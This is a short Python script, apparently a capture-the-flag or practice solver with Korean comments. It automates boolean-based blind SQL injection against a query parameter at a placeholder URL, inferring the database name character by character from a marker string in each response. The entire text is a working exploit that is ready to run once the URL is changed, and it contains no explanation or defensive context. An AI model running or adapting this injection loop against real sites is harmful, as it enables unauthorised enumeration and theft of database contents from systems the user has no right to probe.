import requests
import string

url = "http://example.com/?query="

def send_payload(url):
    # 1. 서버에 요청을 보낸다.
    response = requests.get(url)
    return response.text

def is_true(response):
    # 2. 응답 안에 참을 의미하는 문자열이 있는가?
    return "count = 2409" in response

def extract_database_name():
    # 데이터베이스 이름 추출
    charset = string.ascii_lowercase + string.digits + "?/!@#$%^&*()_+="
    result = ""

    for i in range(1, 30):
        for ch in charset:
            sqli = f"1' AND substring(database(), {i}, 1) = '{ch}'-- -"
            response = send_payload(url + sqli)
            if is_true(response):
                result += ch
                print(f"[{i}]번째 문자 찾음: {ch}")
                break
    return result

if __name__ == "__main__":
    db_name = extract_database_name()
    print(f"\n🎉 데이터베이스 이름은: {db_name}")
 
